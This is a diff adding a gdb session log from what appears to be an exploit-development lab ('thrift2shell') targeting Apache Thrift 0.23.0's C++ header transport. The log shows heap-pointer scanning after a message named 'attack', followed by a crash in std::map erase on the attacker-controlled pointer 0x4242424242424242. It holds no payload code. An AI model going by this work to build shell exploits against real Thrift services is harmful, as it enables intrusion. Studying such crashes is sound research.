@@ -1,0 +1,14 @@
+Breakpoint 1 at 0x152ea: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/live/thrift-0.23.0/lib/cpp/src/thrift/transport/THeaderTransport.cpp, line 301.
+Breakpoint 2 at 0x3409b: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/live/thrift-0.23.0/lib/cpp/src/thrift/server/TConnectedClient.cpp, line 64.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+LISTENING 127.0.0.1:29491
+SCAN_ANCHOR rbuf=0x62bfeadd71f0 sz=726
+PROCESS_REACHED name=attack seqid=1
+SCAN_RBUF=0x62bfeadd71f0 NONZERO_QWORDS=128 EXEC_QWORDS=0 HEAP_QWORDS=1
+SCAN_HEAP off=+1008 val=0x62bfeadd7630 map=[heap]
+SCAN_DONE
+
+Program received signal SIGBUS, Bus error.
+std::_Rb_tree<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::pair<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >, std::_Select1st<std::pair<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > >, std::less<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >, std::allocator<std::pair<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > > >::_M_erase (this=this@entry=0x62bfeadd6938, __x=0x4242424242424242) at /usr/include/c++/13/bits/stl_tree.h:789
+789	      _S_right(_Base_ptr __x) _GLIBCXX_NOEXCEPT
